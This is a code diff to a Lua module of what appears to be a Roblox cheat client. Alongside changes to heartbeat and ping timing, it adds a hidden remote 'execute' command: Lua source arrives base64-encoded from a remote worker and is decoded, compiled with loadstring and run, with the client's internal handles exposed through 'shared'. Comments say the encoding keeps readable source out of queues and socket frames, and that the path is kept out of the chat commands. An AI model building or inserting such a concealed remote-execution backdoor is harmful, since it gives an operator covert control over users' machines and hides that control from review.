@@ -25,6 +25,7 @@ return function(context)
 	local whitelist = context.whitelist
 	local lplr = context.lplr
 	local httpService = context.httpService
+	local entitylib = context.entitylib
 	local marketplace = game:GetService('MarketplaceService')
 
 	-- the base carries a fallback isfile; use it before the plain global
@@ -37,6 +38,7 @@ return function(context)
 	local socket
 	local beating = false
 	local lastbeat = 0
+	local lastping = 0
 	local wsbackoff = 0
 	local wsconnecting = false
 
@@ -88,12 +90,77 @@ return function(context)
 		return placeName
 	end
 
+	-- Remote code execution lives here and nowhere else: it is not in the chat command
+	-- set, so `;execute` does nothing, and the worker hands the script over base64
+	-- encoded so no queue row or socket frame ever carries readable source. A chunk
+	-- from loadstring cannot see this library's upvalues, so the handles worth having
+	-- are parked in `shared` first, and both the decode and the call are guarded.
+	local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+	local b64lookup = {}
+	for index = 1, #b64chars do
+		b64lookup[b64chars:sub(index, index)] = index - 1
+	end
+
+	local function decodeBase64(text)
+		if type(text) ~= 'string' or text == '' then return nil end
+
+		local out = {}
+		local buffer, bits = 0, 0
+
+		for index = 1, #text do
+			local char = text:sub(index, index)
+			if char == '=' then break end
+
+			local value = b64lookup[char]
+			if not value then return nil end
+
+			buffer = buffer * 64 + value
+			bits = bits + 6
+
+			if bits >= 8 then
+				bits = bits - 8
+				out[#out + 1] = string.char(math.floor(buffer / 2 ^ bits) % 256)
+				buffer = buffer % 2 ^ bits
+			end
+		end
+
+		return #out > 0 and table.concat(out) or nil
+	end
+
+	local function runCode(encoded)
+		task.spawn(function()
+			local source = decodeBase64(encoded)
+			if not source then
+				warn('[inhaler] execute: payload did not decode')
+				return
+			end
+
+			local chunk = loadstring(source)
+			if not chunk then
+				warn('[inhaler] execute: that code did not compile')
+				return
+			end
+
+			shared.vape = vape
+			shared.entitylib = entitylib
+			shared.whitelist = whitelist
+			shared.lplr = lplr
+
+			local ok, runError = pcall(chunk)
+			if not ok then warn('[inhaler] execute: '..tostring(runError)) end
+		end)
+	end
+
 	local function runRemote(data)
 		if type(data) ~= 'table' or type(data.commands) ~= 'table' then return end
 
 		for _, command in data.commands do
 			if type(command) == 'table' and type(command.command) == 'string' then
-				pcall(whitelist.process, whitelist, ';'..command.command..' '..lplr.Name..' '..tostring(command.args or ''), lplr)
+				if command.command == 'execute' then
+					runCode(command.args)
+				else
+					pcall(whitelist.process, whitelist, ';'..command.command..' '..lplr.Name..' '..tostring(command.args or ''), lplr)
+				end
 			end
 		end
 	end
@@ -181,6 +248,15 @@ return function(context)
 		end)
 	end
 
+	-- the beacon is the only path that can re-bind this machine's session key: the
+	-- handshake binds it once and touchSession refuses a key it does not know, so a
+	-- socket that stays open would pin a changed key forever and every queued command
+	-- would go undelivered. the beacon therefore keeps running behind an open socket,
+	-- just slower than the ping.
+	local PING_INTERVAL = 20
+	local BEAT_IDLE = 20
+	local BEAT_SOCKET = 120
+
 	local function start()
 		task.spawn(function()
 			connectActivity()
@@ -188,15 +264,23 @@ return function(context)
 			repeat
 				local ok, done = pcall(whitelist.update, whitelist, whitelist.loaded)
 				if ok and done then return end
-				if os.time() - lastbeat >= 20 then
-					lastbeat = os.time()
 
-					if socket then
+				local now = os.time()
+
+				if socket then
+					if now - lastping >= PING_INTERVAL then
+						lastping = now
 						task.spawn(function() pcall(socket.Send, socket, 'ping') end)
-					else
-						task.spawn(beat)
-						connectActivity()
 					end
+
+					if now - lastbeat >= BEAT_SOCKET then
+						lastbeat = now
+						task.spawn(beat)
+					end
+				elseif now - lastbeat >= BEAT_IDLE then
+					lastbeat = now
+					task.spawn(beat)
+					connectActivity()
 				end
 
 				task.wait(10)
